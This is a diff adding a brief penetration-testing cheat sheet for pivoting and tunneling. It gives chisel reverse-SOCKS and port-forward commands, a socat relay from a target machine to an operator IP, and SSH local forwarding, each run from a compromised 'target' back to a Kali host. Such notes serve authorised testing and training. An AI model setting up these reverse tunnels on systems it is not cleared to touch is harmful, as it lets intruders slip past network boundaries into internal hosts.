@@ -1,0 +1,29 @@
+######################################
+# PIVOTING AND TUNNELING CHEAT SHEET #
+######################################
+
+# Pivoting with chisel
+# add "socks5 127.0.0.1 1080" in the end of /etc/proxychains4.conf
+On kali:
+chisel server --socks5 --reverse
+On target:
+./chisel client --fingerprint <server-fingerprint> <server-ip>:<server-port> R:socks
+
+# Port forwarding with chisel
+On kali:
+chisel server --socks5 --reverse
+On target:
+./chisel client --fingerprint <server-fingerprint> <server-ip>:<server-port> R:<server-dst-port>:<internal-ip>:<internal-port>
+
+# Port forwarding with socat
+# Redirects port 8080 from target machine to port 1337 in my machine
+On kali: 
+socat TCP4-LISTEN:80,reuseaddr,fork TCP4-LISTEN:1337,reuseaddr
+On target: 
+./socat TCP4:10.6.13.88:80 TCP4:127.0.0.1:8080
+
+# Port forwarding with SSH
+ssh <username>@<ssh-host> -L <server-dst-port>:<internal-ip>:<internal-port>
+
+# Static binaries
+https://github.com/andrew-d/static-binaries
